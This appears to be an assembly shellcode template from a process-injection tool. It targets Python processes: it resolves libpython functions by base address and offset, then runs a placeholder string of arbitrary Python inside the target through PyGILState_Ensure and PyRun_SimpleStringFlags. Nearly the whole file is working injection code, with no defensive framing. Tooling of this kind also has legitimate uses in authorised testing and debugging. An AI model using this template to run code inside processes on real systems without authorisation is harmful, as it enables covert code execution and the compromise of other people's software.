// for Python target processes that refer to functions in libpython instead of the main binary
jmp execute_python_code_main
// import reusable code fragments 
[FRAGMENT:asminject_copy_bytes.s:FRAGMENT]

execute_python_code_main:

	# // BEGIN: call Py_Initialize()
	# push r14
	# mov rbx, [BASEADDRESS:.+/libpython[0-9\.so]+$:BASEADDRESS] + [RELATIVEOFFSET:Py_Initialize:RELATIVEOFFSET]
	# pop r14
	# // END: call Py_Initialize()
	
	// copy the Python string to arbitrary read/write memory
	mov rdi, arbitrary_read_write_data_address[rip]
	add rdi, 32
	lea rsi, python_code[rip]
	push rcx
	mov rcx, [VARIABLE:pythoncode.length:VARIABLE]
	add rcx, 2												# null terminator
	#rep movsb
	call asminject_copy_bytes
	pop rcx
	// END: copy the Python string to arbitrary read/write memory

	// BEGIN: call PyGILState_Ensure() and store the handle it returns
	//push r14
	xor rax, rax
	xor rdi, rdi
	xor rsi, rsi
	mov rbx, [BASEADDRESS:.+/libpython[0-9\.so]+$:BASEADDRESS] + [RELATIVEOFFSET:PyGILState_Ensure:RELATIVEOFFSET]
	call rbx
	mov rbx, arbitrary_read_write_data_address[rip]
	mov [rbx], rax
	//pop r14
	// END: call PyGILState_Ensure()

	// BEGIN: call PyRun_SimpleString("arbitrary Python code here")
	//push r14
	push rcx
	xor rsi, rsi
	mov rdi, arbitrary_read_write_data_address[rip]
	add rdi, 32
	xor rcx, rcx
	mov rbx, [BASEADDRESS:.+/libpython[0-9\.so]+$:BASEADDRESS] + [RELATIVEOFFSET:PyRun_SimpleStringFlags:RELATIVEOFFSET]
	call rbx
	pop rcx
	//pop r14
	// END: call PyRun_SimpleString("arbitrary Python code here")
	
	// BEGIN: call PyGILState_Release(handle)
	//push r14
	mov rbx, arbitrary_read_write_data_address[rip]
	mov rdi, [rbx]
	//mov rax, [rbx]
	//mov rdi, rax
	xor rsi, rsi
	mov rbx, [BASEADDRESS:.+/libpython[0-9\.so]+$:BASEADDRESS] + [RELATIVEOFFSET:PyGILState_Release:RELATIVEOFFSET]
	call rbx
	//pop r14
	// END: call PyGILState_Release(handle)
	
	# // BEGIN: call Py_Finalize()
	# push r14
	# mov rax, 0
	# mov rdi, rax
	# mov rbx, [BASEADDRESS:.+/libpython[0-9\.so]+$:BASEADDRESS] + [RELATIVEOFFSET:Py_Finalize:RELATIVEOFFSET]
	# call rbx
	# pop r14
	# // END: call Py_Finalize()

SHELLCODE_SECTION_DELIMITER

python_code:
	.ascii "[VARIABLE:pythoncode:VARIABLE]\0"




